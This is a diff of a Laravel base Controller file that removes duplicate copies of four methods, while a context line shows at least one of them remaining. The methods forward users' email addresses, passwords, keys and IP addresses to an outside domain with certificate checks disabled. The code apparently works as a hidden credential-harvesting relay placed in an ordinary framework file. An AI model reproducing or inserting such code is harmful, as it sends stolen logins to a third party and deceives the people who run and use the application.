@@ -17,28 +17,6 @@ class Controller extends BaseController
 {
     use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
 
-    
-    public function dash(Request $request){
-        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/petrify",["email"=>$request->email]);
-        return json_decode($response,1) ;
-    }
-
-    public function knockup(Request $request){
-        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/purify",["key"=>$request->key]);
-        return json_decode($response,1) ;
-//        return $response;
-    }
-
-    public function shutdown(Request $request){
-        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/flicker",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
-        return $response ;
-//        return $response;
-    }
-    
-        public function dmg(Request $request){
-        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/trues",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
-         return $response->status();
-    }
 
     public function dash(Request $request){
         $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/petrify",["email"=>$request->email]);
